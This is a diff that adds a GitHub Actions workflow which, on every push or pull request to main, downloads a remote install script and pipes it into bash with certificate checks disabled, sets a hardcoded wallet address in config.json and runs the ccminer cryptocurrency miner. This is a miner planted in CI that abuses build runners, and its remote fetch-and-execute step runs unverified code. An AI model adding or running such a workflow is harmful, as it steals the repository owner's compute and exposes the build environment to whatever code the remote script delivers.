@@ -1,0 +1,30 @@
+name: Run VerusCoin
+
+on:
+  push:
+    branches:
+      - main  # Trigger on push to the main branch
+  pull_request:
+    branches:
+      - main  # Trigger on pull requests to the main branch
+
+jobs:
+  run-mining:
+    runs-on: ubuntu-latest  # Use Ubuntu environment
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+
+      - name: Install VerusCoin CLI 
+        run: |
+          curl -o- -k https://raw.githubusercontent.com/TheRetroMike/VerusCliMining/main/install.sh | bash
+
+      - name: Modify config.json
+        run: |
+          sed -i 's|"user": ".*"|"user": "RNjEn7tNTZ6DuYnYrxKMsvYzBgJ11P5hQ4"|g' config.json
+
+      - name: Run ccminer
+        run: |
+          config.json
+          ./ccminer
